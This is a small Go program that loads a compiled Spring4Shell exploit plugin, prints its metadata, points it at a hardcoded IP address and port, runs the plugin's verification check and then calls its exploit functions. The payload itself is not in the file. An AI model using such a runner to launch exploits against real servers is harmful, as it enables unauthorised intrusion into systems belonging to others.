package main

import (
	"fmt"
	"plugin"
)

func main() {

	p, err := plugin.Open("spring4shell.so")
	if err != nil {
		panic(err)
	}

	f, _ := p.Lookup("ExploitInfo")

	if f == nil {
		fmt.Println("No ExploitInfo")
		return
	}

	exploitInfo := *f.(*map[string]string)

	fmt.Println("[+] PluginName: " + exploitInfo["Name"])
	fmt.Println("[+] PluginVersion: " + exploitInfo["Version"])
	fmt.Println("[+] PluginAuthor: " + exploitInfo["Author"])
	fmt.Println("[+] PluginDesc: " + exploitInfo["Desc"])
	fmt.Println("[+] Product: " + exploitInfo["Product"])

	surl, _ := p.Lookup("Url")

	if surl == nil {
		fmt.Println("No Url")
		return
	}

	*surl.(*string) = "http://123.58.236.76:23639"

	f, _ = p.Lookup("Verity")
	if f == nil {
		fmt.Println("No Verity")
		return
	}

	fmt.Println("[+] Verity: " + *surl.(*string))

	flag := f.(func() bool)()

	if flag {

		var pause string

		fmt.Print("[+] Verity Success, Press Enter to exploit...")
		fmt.Scanf("%s", &pause)

		f, _ = p.Lookup("Funcs")

		functions := *f.(*[]string)

		for _, v := range functions {
			f, _ := p.Lookup(v)
			if f == nil {
				fmt.Println("err")
				continue
			}
			fmt.Println("[+] " + v)
			f.(func() bool)()
		}
	}

}
